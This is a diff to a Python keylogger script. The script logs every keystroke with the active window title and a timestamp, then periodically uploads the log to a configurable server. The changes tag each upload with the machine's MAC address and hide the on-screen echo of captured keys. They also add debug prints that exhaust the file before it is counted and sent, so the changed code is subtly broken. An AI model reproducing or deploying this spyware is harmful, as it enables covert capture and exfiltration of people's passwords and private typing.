@@ -3,9 +3,11 @@ import pyautogui # to get window name
 import requests # to send logs
 import threading # to make log sending repeat in background
 from datetime import datetime, timezone # to classify logs by time sent
+from getmac import get_mac_address # to get mac address
 
 URL = 'http://127.0.0.1:8000/log' # the URL/IP to which you want to send the logs to
 INTERVAL = 10.0 # Interval between sending logs (in seconds). Don't make this too low because you're going to DDOS yourself.
+MAC = get_mac_address().replace(':', '') # store mac address
 
 with open('keylogger-log', 'w') as l: # to create the file to avoid any errors
     pass
@@ -13,11 +15,13 @@ with open('keylogger-log', 'w') as l: # to create the file to avoid any errors
 def send_log(): # send log
     try:
         with open('keylogger-log', 'rb') as log: # open the file in read-only mode binary
+            print(log.read())
             time = str(datetime.now(timezone.utc))[:-13].replace(':', '.') # get the current utc time, remove milliseconds portion, and switch colons to periods since you cant use colons in file names
             log_name = f'keylogger-log-{time}'
             line_count = len(log.readlines()) # get the number of entries being sent so you know how many to delete from file later
+            print("lines:"+str(line_count))
             files = {'file' : (log_name, log, 'plain/text')} # make the payload for the file containing the file name, the file in binary, and its MIME type
-            r = requests.post(URL, files=files) # POST (send) the file
+            r = requests.post(URL, headers={'mac':MAC}, files=files) # POST (send) the file
             if not 300 > r.status_code >= 200:
                 pass # Leaves the entries to go through later if the request didn't go through
             else: # assume new entries were made during process of sending and delete only entries which were already sent
@@ -28,6 +32,7 @@ def send_log(): # send log
                     for number, line in enumerate(lines):
                         if number > line_count:
                             l.write(line) # rewrite the file, writing only lines of entries which weren't already sent
+            log.close()
     except requests.exceptions.RequestException:
         pass
     threading.Timer(INTERVAL, send_log).start() # start sending logs again after the amount of seconds specified in INTERVAL
@@ -45,7 +50,7 @@ while True:
         window_name = pyautogui.getActiveWindowTitle() # get the window name to know what context caused the keys to be pressed
         time = str(datetime.now(timezone.utc))[:-13]  # get the current utc time, remove milliseconds portion
         entry = f"Key Pressed: {key} Active Window: {window_name} Time: {time}" # make the entry
-        print(entry) # for debugging purposes
+        #print(entry) # for debugging purposes
         try:
             with open("keylogger-log", "a", encoding='utf-8') as log: # open the log file or make a new one if it doesnt exist
                 log.write(entry+'\n') # write the entry into the log
